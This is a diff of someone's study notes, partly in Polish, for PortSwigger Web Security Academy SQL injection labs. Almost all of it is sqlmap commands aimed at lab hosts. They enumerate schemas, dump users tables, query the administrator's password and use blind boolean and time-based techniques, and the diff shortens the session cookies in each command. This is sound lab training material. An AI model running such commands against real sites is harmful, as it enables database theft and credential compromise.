@@ -23,18 +23,18 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 Database engine detection:
 
-sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch  
+sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhd" --batch  
 
 
 --schema (enumerates database schema (databases, tables, columns)) 
 Lepiej zacząć od --dbs, a --schema używać rzadko
 
-sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch --dbms=PostgreSQL --schema
+sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhd" --batch --dbms=PostgreSQL --schema
 
 
 User and Passowrd table display
 
-sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhdEO55lTgCCAdhnWOzwG" --batch --dbms=PostgreSQL -D public -T users_odmlik --dump
+sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/filter?category=Tech+gifts" --cookie="session=eqMTENjiPobPhd" --batch --dbms=PostgreSQL -D public -T users_odmlik --dump
 
 
 
@@ -42,26 +42,26 @@ sqlmap -u "https://0a9300490348e3fc84039a0700d000de.web-security-academy.net/fil
 11. Blind SQL injection with conditional errors
 
 sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
-  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
+  --cookie="session=Zu8T1AQ7R9BcrEPcxb5p; TrackingId=Sy9B2w2HnGLDXX1J" \
   --random-agent \
   --level=2 --risk=1 \
   --batch --threads=10
 
 
 sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
-  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
+  --cookie="session=Zu8T1AQ7R9BcrEPcx; TrackingId=Sy9B2w2HnGLDXX1J" \
   --random-agent \
   --level=2 --risk=1 \
   --batch --threads=10 --dbms=Oracle --technique=B --users
 
 sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
-  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
+  --cookie="session=Zu8T1AQ7R9BcrEPcx; TrackingId=Sy9B2w2HnGLDXX1J" \
   --random-agent \
   --level=2 --risk=1 \
   --batch --threads=10 --dbms=Oracle --technique=B -D Peter --tables
 
 sqlmap -u "https://0ab4000a03d53b9a837b7da700a9009f.web-security-academy.net/filter?category=Pets" \ 
-  --cookie="session=Zu8T1AQ7R9BcrEPcxb5gD9MNgeVdlQ1p; TrackingId=Sy9B2w2HnGLDXX1J" \
+  --cookie="session=Zu8T1AQ7R9BcrEPcx; TrackingId=Sy9B2w2HnGLDXX1J" \
   --random-agent \
   --level=2 --risk=1 \
   --batch --threads=10 --dbms=Oracle --technique=B -D Peter -T USERS --dump
@@ -108,12 +108,12 @@ zaczac od ‘ nastepnie ‘--
 
 fingerprint database system
 
-sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \                     
+sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3Av; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \                     
   --level=2 --risk=1 \
   --batch --threads=10 --fingerprint
 
 
-sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
+sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3Av; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
   --level=5 --risk=3 \
   --batch --threads=10 --dbms=PostgreSQL --dump
 
@@ -131,7 +131,7 @@ Table: users
 
 
 
-sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
+sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJ; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
   --level=5 --risk=3 \
   --batch --threads=10 --dbms=PostgreSQL --sql-query="SELECT username, password FROM users WHERE username='administrator'"
 
@@ -139,7 +139,7 @@ sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" -
 
 zebay zaliczyc, trzeba  opoznic atak o 10 sekund
 
-sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJGNGeCoLgUPv; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
+sqlmap -u "https://0ac800a204809b4b8425905a00aa0051.web-security-academy.net/" --cookie="session=iRMUMl4LaHEzu3AvloEvJ; TrackingId=Cb04EtnLGsgx8JY3" --random-agent \
   --level=5 --risk=3 \
   --batch --threads=10 --dbms=PostgreSQL --sql-query="SELECT username, password FROM users WHERE username='administrator'" --technique=T --time-sec=10
 
@@ -164,9 +164,9 @@ public = schema
 users, tracking = tabele w schemacie public
 
 
-sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTiBYuPxs1v11IY; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5
+sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTi; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5
 
-sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTiBYuPxs1v11IY; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5 --dbms=PostgreSQL –dump
+sqlmap -u "https://0a5f00510354410d820c47a600c20057.web-security-academy.net/filter?category=Gifts" --cookie="session=WFFKkkrqXZWCP1ACvRTi; TrackingId=Zhwn1rVRHhhYbgOC" --level=5 --fingerprint -p TrackingId --technique=T --batch --time-sec=5 --dbms=PostgreSQL –dump
 
 
 
